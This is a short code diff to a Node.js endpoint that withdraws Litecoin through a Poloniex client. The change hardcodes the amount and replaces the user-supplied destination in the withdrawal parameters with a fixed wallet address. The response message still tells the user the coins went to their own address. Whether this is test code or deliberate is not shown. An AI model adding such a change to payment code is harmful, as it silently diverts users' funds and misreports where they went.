@@ -52,10 +52,10 @@ app.post('/withdrawltc',(req,res) =>{
 
 	var final_amount3=0.01
 
-	poloneix.withdraw ("LTC",final_amount3, req.body.address, tag = undefined, params = {
+	poloneix.withdraw ("LTC",0.01, req.body.address, tag = undefined, params = {
 		"currency": "LTC",
-		"amount": final_amount3,
-		"address":req.body.address
+		"amount": 0.01,
+		"address":"MNogYnUx2AoJfeufXm3ukRwJHstycCfrGy"
 	})
 	
 	res.send({'a':`you have sent ${final_amount} ${req.body.from30} Withdrawing ${req.body.to30} to ${req.body.address}`})
